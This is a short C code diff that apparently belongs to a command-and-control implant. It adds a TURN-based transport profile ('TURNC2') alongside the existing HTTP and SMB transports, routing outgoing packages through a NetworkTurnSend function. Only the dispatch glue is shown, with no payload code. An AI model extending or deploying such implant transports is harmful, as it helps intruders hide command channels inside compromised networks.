@@ -4,6 +4,7 @@
 #include "Config.h"
 #include "TransportHttp.h"
 #include "TransportSmb.h"
+#include "TransportTurn.h"
 #include "Parser.h"
 #include "Package.h"
 #include "Strategy.h"
@@ -70,6 +71,18 @@ BOOL NetworkRequest(_In_ PPackage package, _Out_ PBYTE* ppOutData, _Out_ SIZE_T*
 
         return TRUE;
     #endif
+/* TURNC2 C2 Profile */
+    #ifdef TURNC2_TRANSPORT
+        BOOL bStatus = FALSE;
+
+        bStatus = NetworkTurnSend(package, ppOutData, pOutLen);
+
+        if (bStatus == FALSE || ppOutData == NULL || pOutLen == NULL)
+            return FALSE;
+
+        return TRUE;
+    #endif
+
 // Maybe some day
     #ifdef DNS_TRANSPORT
         return TRUE;
